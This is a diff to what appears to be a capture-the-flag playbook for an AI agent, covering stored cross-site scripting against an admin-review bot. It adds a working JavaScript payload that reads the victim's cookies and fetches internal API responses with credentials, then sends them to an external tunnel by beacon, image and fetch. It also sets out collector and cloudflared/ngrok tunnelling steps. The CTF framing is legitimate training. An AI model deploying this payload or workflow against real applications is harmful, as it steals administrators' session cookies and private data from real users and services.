@@ -8,6 +8,56 @@
 
 Applies when there's an "admin reviews your submission" workflow, a report link, or a contact form.
 
+### Collector FIRST — before the first payload
+
+The instant you read "an admin/operator/reviewer will open your submission", start the
+collector. It is a fixed ~30s cost and it is the only channel you can *trust*:
+
+```bash
+python C:/Users/shawn/.claude/skills/ctf/scripts/oob.py --name <challenge>   # prints OOB_URL=
+grep -a 'HIT\|FLAG' /c/Tools/CTF/<challenge>/oob.log
+```
+
+**Do not adopt the app's own in-app channel as your exfil path.** Vaultly-010 had a "Preview
+beacons" panel that read exactly like the intended receiver — `GET /api/sandbox/hits` returning
+`{query, body}` — and it never fired once across four review cycles while the same payloads were
+provably executing and beaconing to a tunnel. Two blind polls on it (3 min + 5 min) cost the
+solve. In-app beacon panels are frequently decoration or dead lab scaffolding.
+
+**Never poll a silent channel longer than 60s.** Silence past a minute means the wrong channel,
+not a slow bot. Change the channel; don't extend the wait.
+
+### One payload, every channel, all tagged
+
+A single round trip should tell you *which* channel lives and *whether* the bot ran at all —
+never spend a review cycle testing one transport:
+
+```html
+<script>
+var OOB = "https://<tunnel>";                       // external collector
+var SELF = location.origin + location.pathname;     // in-app channel, if any
+function send(tag, data) {
+  var q = "?tag=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(String(data).slice(0,1200));
+  try { navigator.sendBeacon(OOB + "/sb?tag=" + encodeURIComponent(tag), String(data).slice(0,1200)); } catch(e){}
+  try { new Image().src = OOB + "/i" + q; } catch(e){}
+  try { fetch(OOB + "/f" + q, {mode:"no-cors", keepalive:true}); } catch(e){}
+  try { new Image().src = SELF + q; } catch(e){}
+}
+// ALWAYS send this first — it separates "bot never ran" from "exfil channel wrong",
+// and location/origin tells you what the bot actually resolves the host to.
+send("alive", location.href + " | ua=" + navigator.userAgent + " | ck=" + document.cookie);
+["https://api.target/api/hq/recovery", "/api/flag"].forEach(function (u, i) {
+  fetch(u, {credentials: "include"})
+    .then(function (r) { return r.text().then(function (t) { send("R" + i + "_" + r.status, t); }); })
+    .catch(function (e) { send("R" + i + "_ERR", e && e.message); });   // errors too — a block is data
+});
+</script>
+```
+
+The `alive` beacon is the highest-value line in the payload. On Vaultly-010 it revealed the bot
+was headless Chrome on **`http://localhost:3001`**, not the advertised public hostname — which
+explains which fetches are same-origin vs cross-origin, and therefore which need CORS at all.
+
 ```bash
 # tunnel first — see the note below on ngrok vs cloudflared
 /c/Tools/cloudflared.exe tunnel --url http://localhost:8080 &
@@ -26,6 +76,12 @@ curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/
 ```
 
 **Use cloudflared, not ngrok, for anything a real browser loads.** ngrok's free tier serves an interstitial HTML page to browser-like requests unless a custom header is present, and a `<script src>` can't send one — this silently broke a working exploit chain on FurHire-013 while curl tests passed. Reserve ngrok for server-side OOB callbacks (SSRF pings).
+
+Precisely: the interstitial hits requests that look like **navigations** (`Accept: text/html`) —
+`<script src>`, top-level redirects, `window.open`. Sub-resource and background transports
+(`sendBeacon`, `fetch`, `new Image()`) do get through, which is why ngrok worked on Vaultly-010.
+`oob.py` defaults to cloudflared anyway so the distinction never has to be remembered under time
+pressure; `--tunnel ngrok` is the fallback if cloudflared is slow to come up.
 
 Cookie arrives → set it as `$AUTH_HEADER` and re-probe everything.
 
